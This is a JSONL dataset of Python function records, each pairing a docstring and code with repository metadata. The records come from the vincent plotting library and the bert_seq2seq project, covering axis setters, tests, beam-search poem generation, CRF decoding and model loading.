{"docstring": "\"\"\"Set common axis properties such as color\n\nParameters\n----------\ncolor: str, default None\n    Hex color str, etc\n\"\"\"\n", "func_signal": "def common_axis_properties(self, color=None, title_size=None):\n", "code": "if self.axes:\n    for axis in self.axes:\n        self._set_axis_properties(axis)\n        self._set_all_axis_color(axis, color)\n        if title_size:\n            ref = ValueRef(value=title_size)\n            axis.properties.title.font_size = ref\nelse:\n    raise ValueError('This Visualization has no axes!')\nreturn self", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"list or KeyedList of ``Axis`` : Axis definitions\n\nAxes define the locations of the data being mapped by the scales.\nSee the :class:`Axis` class for details.\n\"\"\"\n", "func_signal": "def axes(value):\n", "code": "for i, entry in enumerate(value):\n    _assert_is_type('axes[{0}]'.format(i), entry, Axis)", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"Test automatic data type importing\"\"\"\n\n", "func_signal": "def test_data_type():\n", "code": "puts1 = [10, 20, 30, 40, 50]\nputs2 = {'apples': 10, 'bananas': 20, 'oranges': 30}\n\ngets1 = [{'col': 'data', 'idx': 0, 'val': 10},\n         {'col': 'data', 'idx': 1, 'val': 20},\n         {'col': 'data', 'idx': 2, 'val': 30},\n         {'col': 'data', 'idx': 3, 'val': 40},\n         {'col': 'data', 'idx': 4, 'val': 50}]\ngets2 = [{'col': 'data', 'idx': 'apples', 'val': 10},\n         {'col': 'data', 'idx': 'bananas', 'val': 20},\n         {'col': 'data', 'idx': 'oranges', 'val': 30}]\n\nfor ins, outs in zip([puts1, puts2], [gets1, gets2]):\n    test = data_type(ins)\n    nt.assert_list_equal(test.values, outs)\n\n# From Iters\nputs = {'x': [1, 2, 3], 'y': [10, 20, 30], 'z': [40, 50, 60]}\ngets = [{'col': 'y', 'idx': 1, 'val': 10},\n        {'col': 'y', 'idx': 2, 'val': 20},\n        {'col': 'y', 'idx': 3, 'val': 30},\n        {'col': 'z', 'idx': 1, 'val': 40},\n        {'col': 'z', 'idx': 2, 'val': 50},\n        {'col': 'z', 'idx': 3, 'val': 60}]\n\ntest = data_type(puts, iter_idx='x')\nnt.assert_list_equal(test.values, gets)\n\n# Pandas\ndf = pd.DataFrame({'one': [1, 2, 3], 'two': [4, 5, 6]})\nseries = pd.Series([1, 2, 3], name='test')\ngets1 = [{'col': 'one', 'idx': 0, 'val': 1},\n         {'col': 'two', 'idx': 0, 'val': 4},\n         {'col': 'one', 'idx': 1, 'val': 2},\n         {'col': 'two', 'idx': 1, 'val': 5},\n         {'col': 'one', 'idx': 2, 'val': 3},\n         {'col': 'two', 'idx': 2, 'val': 6}]\ngets2 = [{'col': 'test', 'idx': 0, 'val': 1},\n         {'col': 'test', 'idx': 1, 'val': 2},\n         {'col': 'test', 'idx': 2, 'val': 3}]\ntest_df = data_type(df)\ntest_series = data_type(series)\nnt.assert_list_equal(test_df.values, gets1)\nnt.assert_list_equal(test_series.values, gets2)\n\n# Bad type\nclass BadType(object):\n    'Bad data type'\n    pass\n\ntest = BadType()\nnt.assert_raises(ValueError, data_type, test)", "path": "vincent/tests/test_charts.py", "commit_date": "2014-04-11 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"2-element list of ints : Dimensions of the viewport\n\nThe viewport is a bounding box containing the visualization. If the\ndimensions of the visualization are larger than the viewport, then\nthe visualization will be scrollable.\n\nIf undefined, then the full visualization is shown.\n\"\"\"\n", "func_signal": "def viewport(value):\n", "code": "if len(value) != 2:\n    raise ValueError('viewport must have 2 dimensions')\nfor v in value:\n    _assert_is_type('viewport dimension', v, int)\n    if v < 0:\n        raise ValueError('viewport dimensions cannot be negative')", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"Apply axis titles to the figure.\n\nThis is a convenience method for manually modifying the \"Axes\" mark.\n\nParameters\n----------\nx: string, default 'null'\n    X-axis title\ny: string, default 'null'\n    Y-axis title\n\nExample\n-------\n>>>vis.axis_titles(y=\"Data 1\", x=\"Data 2\")\n\n\"\"\"\n", "func_signal": "def axis_titles(self, x=None, y=None):\n", "code": "keys = self.axes.get_keys()\n\nif keys:\n    for key in keys:\n        if key == 'x':\n            self.axes[key].title = x\n        elif key == 'y':\n            self.axes[key].title = y\nelse:\n    self.axes.extend([Axis(type='x', title=x),\n                      Axis(type='y', title=y)])\nreturn self", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"int : Width of the visualization in pixels\n\nDefault is 500 if undefined.\n\"\"\"\n", "func_signal": "def width(value):\n", "code": "if value < 0:\n    raise ValueError('width cannot be negative')", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"int : Height of the visualization in pixels\n\nDefault is 500 if undefined.\n\"\"\"\n", "func_signal": "def height(value):\n", "code": "if value < 0:\n    raise ValueError('height cannot be negative')", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"Initialize a Visualization\n\nIn addition to setting any attributes, this sets the data, marks,\nscales, and axes properties to empty KeyedLists if they aren't\ndefined by the arguments.\n\"\"\"\n", "func_signal": "def __init__(self, *args, **kwargs):\n", "code": "super(Visualization, self).__init__(*args, **kwargs)\n\nfor attrib in ('data', 'scales'):\n    if not getattr(self, attrib):\n        setattr(self, attrib, KeyedList(attr_name='name'))\n\nfor attrib in ('axes', 'marks'):\n    if not getattr(self, attrib):\n        setattr(self, attrib, KeyedList(attr_name='type'))\n\n# Legends don't get keyed.\nif not self.legends:\n    self.legends = []", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"Convenience method for adding color brewer scales to charts with a\ncolor scale, such as stacked or grouped bars.\n\nSee the colors here: http://colorbrewer2.org/\n\nOr here: http://bl.ocks.org/mbostock/5577023\n\nThis assumes that a 'color' scale exists on your chart.\n\nParameters\n----------\nbrew: string, default None\n    Color brewer scheme (BuGn, YlOrRd, etc)\nrange: list, default None\n    List of colors. Ex: ['#ac4142', '#d28445', '#f4bf75']\n\"\"\"\n", "func_signal": "def colors(self, brew=None, range_=None):\n", "code": "if brew:\n    self.scales['color'].range = brews[brew]\nelif range_:\n    self.scales['color'].range = range_\nreturn self", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"list or KeyedList of ``Data`` : Data definitions\n\nThis defines the data being visualized. See the :class:`Data` class\nfor details.\n\"\"\"\n", "func_signal": "def data(value):\n", "code": "for i, entry in enumerate(value):\n    _assert_is_type('data[{0}]'.format(i), entry,  Data)", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\" Initialize the weights.\n\"\"\"\n", "func_signal": "def init_bert_weights(self, module):\n", "code": "if isinstance(module, (nn.Linear)):\n    # \u521d\u59cb\u7ebf\u6027\u6620\u5c04\u5c42\u7684\u53c2\u6570\u4e3a\u6b63\u6001\u5206\u5e03\n    module.weight.data.normal_(mean=0.0, std=self.config.initializer_range)\nelif isinstance(module, BertLayerNorm):\n    # \u521d\u59cb\u5316LayerNorm\u4e2d\u7684alpha\u4e3a\u51681, beta\u4e3a\u51680\n    module.bias.data.zero_()\n    module.weight.data.fill_(1.0)\nif isinstance(module, nn.Linear) and module.bias is not None:\n    # \u521d\u59cb\u5316\u504f\u7f6e\u4e3a0\n    module.bias.data.zero_()", "path": "bert_seq2seq/bert_seq2seq/model/roberta_model.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "\"\"\"\nbeam-search\u64cd\u4f5c\n\"\"\"\n", "func_signal": "def beam_search_poem_v2(self, text, token_ids, token_type_ids, word2ix, beam_size=1, device=\"cpu\"):\n", "code": "yayun_pos = []\nif \"\u4e94\u8a00\u5f8b\u8bd7\" in text:\n    yayun_pos = [10, 22, 34, 46]\nelif \"\u4e94\u8a00\u7edd\u53e5\" in text:\n    yayun_pos = [10, 22]\nelif \"\u4e03\u8a00\u5f8b\u8bd7\" in text:\n    yayun_pos = [14, 30, 46, 62]\nelif \"\u4e03\u8a00\u7edd\u53e5\" in text:\n    yayun_pos = [14, 30]\nsep_id = word2ix[\"[SEP]\"]\ndouhao_id = word2ix[\"\uff0c\"]# \u9017\u53f7\nix2word = {v: k for k, v in word2ix.items()}\njuhao_id = word2ix[\"\u3002\"]# \u53e5\u53f7\nrepeat_word = []\n# \u7528\u6765\u4fdd\u5b58\u8f93\u51fa\u5e8f\u5217\noutput_ids = torch.empty(1, 0, device=device, dtype=torch.long)\nlast_chars = torch.empty(1, 0, device=device, dtype=torch.long)\nyayun_chars = (-1) * torch.ones(beam_size, dtype=torch.long)\nstart = 0\nwith torch.no_grad(): \n    output_scores = torch.zeros(token_ids.shape[0], device=device)\n    for step in range(self.out_max_length):\n        if step == 0:\n            scores = self.forward(token_ids, token_type_ids, device=device)\n            # \u91cd\u590dbeam-size\u6b21 \u8f93\u5165ids\n            token_ids = token_ids.view(1, -1).repeat(beam_size, 1)\n            token_type_ids = token_type_ids.view(1, -1).repeat(beam_size, 1)\n        else:\n            scores = self.forward(new_input_ids, new_token_type_ids, device=device)\n        \n        logit_score = torch.log_softmax(scores[:, -1], dim=-1)\n        # if len(last_chars) != 0:\n        #     logit_score[last_chars] -= 5\n        for i, char in enumerate(last_chars):\n            logit_score[i, char] -= 2\n            for word in repeat_word:\n                logit_score[i, word] -= 1\n        if step in yayun_pos:\n            # print(\"step is \" + str(step))\n            # print(\"yayun_chars is \" + str(yayun_chars))\n            for i, char in enumerate(last_chars):\n                if yayun_chars[i].item() != -1:\n                    yayuns = yayun_list[yayun_chars[i].item()]\n                    for char in yayuns:\n                        ix = word2ix.get(char, -1)\n                        if ix != -1:\n                            # print(\"char is \" + str(char))\n                            logit_score[i, ix] += 3\n        logit_score = output_scores.view(-1, 1) + logit_score # \u7d2f\u8ba1\u5f97\u5206\n        ## \u53d6topk\u7684\u65f6\u5019\u6211\u4eec\u662f\u5c55\u5e73\u4e86\u7136\u540e\u518d\u53bb\u8c03\u7528topk\u51fd\u6570\n        # \u5c55\u5e73\n        logit_score = logit_score.view(-1)\n        hype_score, hype_pos = torch.topk(logit_score, beam_size)\n        indice1 = (hype_pos // scores.shape[-1]) # \u884c\u7d22\u5f15\n        indice2 = (hype_pos % scores.shape[-1]).long().reshape(-1, 1) # \u5217\u7d22\u5f15\n        \n        for index, each_out in zip(indice1, indice2):\n            index = index.item()\n            each_out = each_out.item()\n            \n            if each_out in repeat_word:\n                pass \n                # repeat_word[index].append(each_out)\n                # hype_score[index] -= 2 * repeat_word[index].count(each_out)\n            else :\n                repeat_word.append(each_out)\n            \n            if start < beam_size and each_out == douhao_id and len(last_chars) != 0:\n                start += 1\n                word = ix2word[last_chars[index].item()]# \u627e\u5230\u4e0a\u4e00\u4e2a\u5b57\u7b26 \u8bb0\u4f4f\u5176\u62bc\u97f5\u60c5\u51b5\n                for i, each_yayun in enumerate(yayun_list):\n                    if word in each_yayun:\n                        yayun_chars[index] = i\n                        break\n                \n            # if each_out == juhao_id and len(last_chars) != 0:  \n            #     word = ix2word[last_chars[index].item()]\n            #     if yayun_chars[index].item() != -1 and word in yayun_list[yayun_chars[index].item()]:\n            #         hype_score[index] += 10\n            #     else:\n            #         hype_score[index] -= 5\n\n        # \u66f4\u65b0\u5f97\u5206\n        output_scores = hype_score\n\n        last_chars = indice2\n\n        output_ids = torch.cat([output_ids[indice1], indice2], dim=1).long()\n        new_input_ids = torch.cat([token_ids, output_ids], dim=1)\n        new_token_type_ids = torch.cat([token_type_ids, torch.ones_like(output_ids)], dim=1)\n\n        end_counts = (output_ids == sep_id).sum(1)  # \u7edf\u8ba1\u51fa\u73b0\u7684end\u6807\u8bb0\n        best_one = output_scores.argmax()\n        if end_counts[best_one] == 1:\n            # \u8bf4\u660e\u51fa\u73b0\u7ec8\u6b62\u4e86\uff5e\n            # print(repeat_word)\n            # print(yayun_chars)\n            return output_ids[best_one]\n        else :\n            # \u4fdd\u7559\u672a\u5b8c\u6210\u90e8\u5206\n            flag = (end_counts < 1)  # \u6807\u8bb0\u672a\u5b8c\u6210\u5e8f\u5217\n            if not flag.all():  # \u5982\u679c\u6709\u5df2\u5b8c\u6210\u7684\n                token_ids = token_ids[flag]\n                token_type_ids = token_type_ids[flag]\n                last_chars = last_chars[flag]\n                yayun_chars = yayun_chars[flag]\n                new_input_ids = new_input_ids[flag]\n                new_token_type_ids = new_token_type_ids[flag]\n                output_ids = output_ids[flag]  # \u6254\u6389\u5df2\u5b8c\u6210\u5e8f\u5217\n                output_scores = output_scores[flag]  # \u6254\u6389\u5df2\u5b8c\u6210\u5e8f\u5217\n                end_counts = end_counts[flag]  # \u6254\u6389\u5df2\u5b8c\u6210end\u8ba1\u6570\n                beam_size = flag.sum()  # topk\u76f8\u5e94\u53d8\u5316\n                flag = flag.long()\n\n\n    # print(repeat_word)\n    # print(yayun_chars)\n    return output_ids[output_scores.argmax()]", "path": "bert_seq2seq/bert_seq2seq/seq2seq_model.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "\"\"\"\n\u8ba1\u7b97loss\npredictions: (batch_size, 1)\n\"\"\"\n", "func_signal": "def compute_loss(self, predictions, labels):\n", "code": "predictions = predictions.view(-1, self.target_size)\nlabels = labels.view(-1)\nloss = nn.CrossEntropyLoss(reduction=\"mean\")\nreturn loss(predictions, labels)", "path": "bert_seq2seq/bert_seq2seq/bert_cls_classifier.py", "commit_date": "2020-11-02 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "\"\"\"\n\u8ba1\u7b97\u5f52\u4e00\u5316\u56e0\u5b50Z(X)\n\"\"\"\n", "func_signal": "def log_norm_step(self, y_pred, mask):\n", "code": "state = y_pred[:, 0] # \u521d\u59cbZ(X)\ny_pred = y_pred[:, 1: ].contiguous()\nmask = mask[:, 1:].contiguous()\nbatch, seq_len, out_dim = y_pred.shape\nfor t in range(seq_len):\n    cur_mask = mask[:, t]\n    state = torch.unsqueeze(state, 2) # (batch, out_dim, 1)\n    g = torch.unsqueeze(self.trans, 0) # (1, out_dim, out_dim)\n    outputs = self.logsumexp(state + g, dim=1) # batch, out_dim\n    outputs = outputs + y_pred[:, t]\n    outputs = cur_mask * outputs + (1 - cur_mask) * state.squeeze(-1)\n    state = outputs\n\nreturn outputs", "path": "bert_seq2seq/bert_seq2seq/model/crf.py", "commit_date": "2020-06-17 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "# \u5bf9 \u4e00\u4e2a \u53e5\u5b50\u751f\u6210\u76f8\u5e94\u7684\u7ed3\u679c\n## \u901a\u8fc7\u8f93\u51fa\u6700\u5927\u957f\u5ea6\u5f97\u5230\u8f93\u5165\u7684\u6700\u5927\u957f\u5ea6\uff0c\u8fd9\u91cc\u95ee\u9898\u4e0d\u5927\uff0c\u5982\u679c\u8d85\u8fc7\u6700\u5927\u957f\u5ea6\u4f1a\u8fdb\u884c\u622a\u65ad\n", "func_signal": "def generate(self, text, out_max_length=40, beam_size=1, device=\"cpu\", is_poem=False, max_length=256):\n", "code": "self.out_max_length = out_max_length\ninput_max_length = max_length - out_max_length\n# print(text)\ntoken_ids, token_type_ids = self.tokenizer.encode(text, max_length=input_max_length)\ntoken_ids = torch.tensor(token_ids, device=device).view(1, -1)\ntoken_type_ids = torch.tensor(token_type_ids, device=device).view(1, -1)\nif is_poem:## \u53e4\u8bd7\u7684beam-search\u7a0d\u6709\u4e0d\u540c\n    \n    out_puts_ids = self.beam_search_poem(text, token_ids, token_type_ids, self.word2ix, beam_size=beam_size, device=device)\nelse :   \n    out_puts_ids = self.beam_search(token_ids, token_type_ids, self.word2ix, beam_size=beam_size, device=device)\n\n# \u89e3\u7801 \u5f97\u5230\u76f8\u5e94\u8f93\u51fa\n# if err is False:\n#     return self.tokenizer.decode(out_puts_ids)\n\nreturn self.tokenizer.decode(out_puts_ids.cpu().numpy())", "path": "bert_seq2seq/bert_seq2seq/seq2seq_model.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "## \u4f20\u5165\u8f93\u5165\uff0c\u4f4d\u7f6e\u7f16\u7801\uff0ctoken type id \uff0c\u8fd8\u6709\u53e5\u5b50a \u548c\u53e5\u5b50b\u7684\u957f\u5ea6\uff0c\u6ce8\u610f\u90fd\u662f\u4f20\u5165\u4e00\u4e2abatch\u6570\u636e\n##  \u4f20\u5165\u7684\u51e0\u4e2a\u503c\uff0c\u5728seq2seq \u7684batch iter \u51fd\u6570\u91cc\u9762\u90fd\u53ef\u4ee5\u8fd4\u56de\n", "func_signal": "def forward(self, input_tensor, token_type_id, position_enc=None, labels=None, device=\"cpu\"):\n", "code": "input_shape = input_tensor.shape\nbatch_size = input_shape[0]\nseq_len = input_shape[1]\n## \u6784\u5efa\u7279\u6b8a\u7684mask\nones = torch.ones((1, 1, seq_len, seq_len), dtype=torch.float32, device=device)\na_mask = ones.tril() # \u4e0b\u4e09\u89d2\u77e9\u9635\ns_ex12 = token_type_id.unsqueeze(1).unsqueeze(2).float()\ns_ex13 = token_type_id.unsqueeze(1).unsqueeze(3).float()\na_mask = (1.0 - s_ex12) * (1.0 - s_ex13) + s_ex13 * a_mask \n    \nenc_layers, _ = self.bert(input_tensor, position_ids=position_enc, token_type_ids=token_type_id, attention_mask=a_mask, \n                            output_all_encoded_layers=True)\nsquence_out = enc_layers[-1] ## \u53d6\u51fa\u6765\u6700\u540e\u4e00\u5c42\u8f93\u51fa\n\npredictions = self.decoder(squence_out)\n\nif labels is not None:\n    ## \u8ba1\u7b97loss\n    ## \u9700\u8981\u6784\u5efa\u7279\u6b8a\u7684\u8f93\u51famask \u624d\u80fd\u8ba1\u7b97\u6b63\u786e\u7684loss\n    # \u9884\u6d4b\u7684\u503c\u4e0d\u7528\u53d6\u6700\u540esep\u7b26\u53f7\u7684\u7ed3\u679c \u56e0\u6b64\u662f\u5230-1\n    predictions = predictions[:, :-1].contiguous()\n    target_mask = token_type_id[:, 1:].contiguous()\n    loss = self.compute_loss(predictions, labels, target_mask)\n    return predictions, loss \nelse :\n    return predictions", "path": "bert_seq2seq/bert_seq2seq/seq2seq_model.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "\"\"\"\u4ecesequence\u4e2d\u5bfb\u627e\u5b50\u4e32pattern\n\u5982\u679c\u627e\u5230\uff0c\u8fd4\u56de\u7b2c\u4e00\u4e2a\u4e0b\u6807\uff1b\u5426\u5219\u8fd4\u56de-1\u3002\n\"\"\"\n", "func_signal": "def search(pattern, sequence):\n", "code": "n = len(pattern)\nfor i in range(len(sequence)):\n    if sequence[i:i + n] == pattern:\n        return i\nreturn -1", "path": "bert_seq2seq/test/relation_extract_test.py", "commit_date": "2020-12-17 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "\"\"\"\nbeam-search\u64cd\u4f5c\n\"\"\"\n", "func_signal": "def beam_search_poem(self, text, token_ids, token_type_ids, word2ix, beam_size=1, device=\"cpu\"):\n", "code": "yayun_pos = []\ntitle = text.split(\"##\")[0]\nif \"\u4e94\u8a00\u5f8b\u8bd7\" in text:\n    yayun_pos = [10, 22, 34, 46]\nelif \"\u4e94\u8a00\u7edd\u53e5\" in text:\n    yayun_pos = [10, 22]\nelif \"\u4e03\u8a00\u5f8b\u8bd7\" in text:\n    yayun_pos = [14, 30, 46, 62]\nelif \"\u4e03\u8a00\u7edd\u53e5\" in text:\n    yayun_pos = [14, 30]\nsep_id = word2ix[\"[SEP]\"]\ndouhao_id = word2ix[\"\uff0c\"]# \u9017\u53f7\nix2word = {v: k for k, v in word2ix.items()}\njuhao_id = word2ix[\"\u3002\"]# \u53e5\u53f7\nrepeat_word = [[] for i in range(beam_size)]\n# \u7528\u6765\u4fdd\u5b58\u8f93\u51fa\u5e8f\u5217\noutput_ids = torch.empty(1, 0, device=device, dtype=torch.long)\nlast_chars = torch.empty(1, 0, device=device, dtype=torch.long)\nyayun_chars = (-1) * torch.ones(beam_size, dtype=torch.long)\nstart = 0\nwith torch.no_grad(): \n    output_scores = torch.zeros(token_ids.shape[0], device=device)\n    for step in range(self.out_max_length):\n        if step == 0:\n            scores = self.forward(token_ids, token_type_ids, device=device)\n            # \u91cd\u590dbeam-size\u6b21 \u8f93\u5165ids\n            token_ids = token_ids.view(1, -1).repeat(beam_size, 1)\n            token_type_ids = token_type_ids.view(1, -1).repeat(beam_size, 1)\n        else:\n            scores = self.forward(new_input_ids, new_token_type_ids, device=device)\n        \n        logit_score = torch.log_softmax(scores[:, -1], dim=-1)\n        \n        for i, char in enumerate(last_chars):\n            \n            for word in repeat_word[i]:\n                logit_score[i, word] -= 5\n            for word in title:\n                ix = word2ix.get(word, -1)\n                if ix != -1:\n                    logit_score[i, ix] += 2\n\n        if step in yayun_pos:\n            # print(\"step is \" + str(step))\n            # print(\"yayun_chars is \" + str(yayun_chars))\n            for i, char in enumerate(last_chars):\n                if yayun_chars[i].item() != -1:\n                    yayuns = yayun_list[yayun_chars[i].item()]\n                    for char in yayuns:\n                        ix = word2ix.get(char, -1)\n                        if ix != -1:\n                            # print(\"char is \" + str(char))\n                            logit_score[i, ix] += 10\n\n\n        logit_score = output_scores.view(-1, 1) + logit_score # \u7d2f\u8ba1\u5f97\u5206\n        ## \u53d6topk\u7684\u65f6\u5019\u6211\u4eec\u662f\u5c55\u5e73\u4e86\u7136\u540e\u518d\u53bb\u8c03\u7528topk\u51fd\u6570\n        # \u5c55\u5e73\n        logit_score = logit_score.view(-1)\n        hype_score, hype_pos = torch.topk(logit_score, beam_size)\n        indice1 = (hype_pos // scores.shape[-1]) # \u884c\u7d22\u5f15\n        indice2 = (hype_pos % scores.shape[-1]).long().reshape(-1, 1) # \u5217\u7d22\u5f15\n        \n        for index, each_out in zip(indice1, indice2):\n            index = index.item()\n            each_out = each_out.item()\n            \n            if each_out in repeat_word[index]:\n                pass \n                # repeat_word[index].append(each_out)\n                # hype_score[index] -= 2 * repeat_word[index].count(each_out)\n            else :\n                repeat_word[index].append(each_out)\n            \n            if start < beam_size and each_out == douhao_id and len(last_chars) != 0:\n                start += 1\n                word = ix2word[last_chars[index].item()]# \u627e\u5230\u4e0a\u4e00\u4e2a\u5b57\u7b26 \u8bb0\u4f4f\u5176\u62bc\u97f5\u60c5\u51b5\n                for i, each_yayun in enumerate(yayun_list):\n                    if word in each_yayun:\n                        yayun_chars[index] = i\n                        break\n                \n            # if each_out == juhao_id and len(last_chars) != 0:  \n            #     word = ix2word[last_chars[index].item()]\n            #     if yayun_chars[index].item() != -1 and word in yayun_list[yayun_chars[index].item()]:\n            #         hype_score[index] += 10\n            #     else:\n            #         hype_score[index] -= 5\n\n        # \u66f4\u65b0\u5f97\u5206\n        output_scores = hype_score\n\n        last_chars = indice2\n\n        output_ids = torch.cat([output_ids[indice1], indice2], dim=1).long()\n        new_input_ids = torch.cat([token_ids, output_ids], dim=1)\n        new_token_type_ids = torch.cat([token_type_ids, torch.ones_like(output_ids)], dim=1)\n\n        end_counts = (output_ids == sep_id).sum(1)  # \u7edf\u8ba1\u51fa\u73b0\u7684end\u6807\u8bb0\n        best_one = output_scores.argmax()\n        if end_counts[best_one] == 1:\n            # \u8bf4\u660e\u51fa\u73b0\u7ec8\u6b62\u4e86\uff5e\n            # print(repeat_word)\n            # print(yayun_chars)\n            return output_ids[best_one][:-1]\n        else :\n            # \u4fdd\u7559\u672a\u5b8c\u6210\u90e8\u5206\n            flag = (end_counts < 1)  # \u6807\u8bb0\u672a\u5b8c\u6210\u5e8f\u5217\n            if not flag.all():  # \u5982\u679c\u6709\u5df2\u5b8c\u6210\u7684\n                token_ids = token_ids[flag]\n                token_type_ids = token_type_ids[flag]\n                last_chars = last_chars[flag]\n                yayun_chars = yayun_chars[flag]\n                new_input_ids = new_input_ids[flag]\n                new_token_type_ids = new_token_type_ids[flag]\n                output_ids = output_ids[flag]  # \u6254\u6389\u5df2\u5b8c\u6210\u5e8f\u5217\n                output_scores = output_scores[flag]  # \u6254\u6389\u5df2\u5b8c\u6210\u5e8f\u5217\n                end_counts = end_counts[flag]  # \u6254\u6389\u5df2\u5b8c\u6210end\u8ba1\u6570\n                beam_size = flag.sum()  # topk\u76f8\u5e94\u53d8\u5316\n                flag = flag.long()\n\n                new_repeat_word = []\n                for index, i in enumerate(flag):\n                    if i.item() == 1:\n                        new_repeat_word.append(repeat_word[index])\n             \n                repeat_word = new_repeat_word\n\n\n    # print(repeat_word)\n    # print(yayun_chars)\n    return output_ids[output_scores.argmax()]", "path": "bert_seq2seq/bert_seq2seq/seq2seq_model.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "\"\"\"\n\u7ef4\u7279\u6bd4\u7b97\u6cd5 \u89e3\u7801\nnodes: (seq_len, target_size)\ntrans: (target_size, target_size)\n\"\"\"\n", "func_signal": "def viterbi_decode(nodes, trans):\n", "code": "with torch.no_grad():\n    scores = nodes[0]\n    scores[1:] -= 100000 # \u521a\u5f00\u59cb\u6807\u7b7e\u80af\u5b9a\u662f\"O\"\n    target_size = nodes.shape[1]\n    seq_len = nodes.shape[0]\n    labels = torch.arange(0, target_size).view(1, -1)\n    path = labels\n    for l in range(1, seq_len):\n        scores = scores.view(-1, 1)\n        M = scores + trans + nodes[l].view(1, -1)\n        scores, ids = M.max(0)\n        path = torch.cat((path[:, ids], labels), dim=0)\n        # print(scores)\n    # print(scores)\n    return path[:, scores.argmax()]", "path": "bert_seq2seq/test/\u7ec6\u7c92\u5ea6ner_test.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "\"\"\"\ntarget_mask : \u53e5\u5b50a\u90e8\u5206\u548cpad\u90e8\u5206\u5168\u4e3a0\uff0c \u800c\u53e5\u5b50b\u90e8\u5206\u4e3a1\n\"\"\"\n", "func_signal": "def compute_loss(self, predictions, labels, target_mask):\n", "code": "predictions = predictions.view(-1, self.vocab_size)\nlabels = labels.view(-1)\ntarget_mask = target_mask.view(-1).float()\nloss = nn.CrossEntropyLoss(ignore_index=0, reduction=\"none\")\nreturn (loss(predictions, labels) * target_mask).sum() / target_mask.sum() ## \u901a\u8fc7mask \u53d6\u6d88 pad \u548c\u53e5\u5b50a\u90e8\u5206\u9884\u6d4b\u7684\u5f71\u54cd", "path": "bert_seq2seq/bert_seq2seq/seq2seq_model.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "920232796/bert_seq2seq", "stars": 1247, "license": "apache-2.0", "language": "python", "size": 3617}
{"docstring": "\"\"\"\nmodel_path: \u6a21\u578b\u4f4d\u7f6e\n\u8fd9\u662f\u4e2a\u7edf\u4e00\u7684\u63a5\u53e3\uff0c\u7528\u6765\u52a0\u8f7d\u6a21\u578b\u7684\nmodel_class : seq2seq or encoder\n\"\"\"\n", "func_signal": "def load_bert(word2ix, model_name=\"roberta\", model_class=\"seq2seq\", target_size=0):\n", "code": "if model_class == \"seq2seq\":\n    bert_model = Seq2SeqModel(word2ix, model_name=model_name)\n    return bert_model\nelif model_class == \"cls\":\n    if target_size == 0:\n        raise Exception(\"\u5fc5\u987b\u4f20\u5165\u53c2\u6570 target_size\uff0c\u624d\u80fd\u786e\u5b9a\u9884\u6d4b\u591a\u5c11\u5206\u7c7b\")\n    bert_model = BertClsClassifier(word2ix, target_size, model_name=model_name)\n    return bert_model\nelif model_class == \"sequence_labeling\":\n    ## \u5e8f\u5217\u6807\u6ce8\u6a21\u578b\n    if target_size == 0:\n        raise Exception(\"\u5fc5\u987b\u4f20\u5165\u53c2\u6570 target_size\uff0c\u624d\u80fd\u786e\u5b9a\u9884\u6d4b\u591a\u5c11\u5206\u7c7b\")\n    bert_model = BertSeqLabeling(word2ix, target_size, model_name=model_name)\n    return bert_model\nelif model_class == \"sequence_labeling_crf\":\n    # \u5e26\u6709crf\u5c42\u7684\u5e8f\u5217\u6807\u6ce8\u6a21\u578b\n    if target_size == 0:\n        raise Exception(\"\u5fc5\u987b\u4f20\u5165\u53c2\u6570 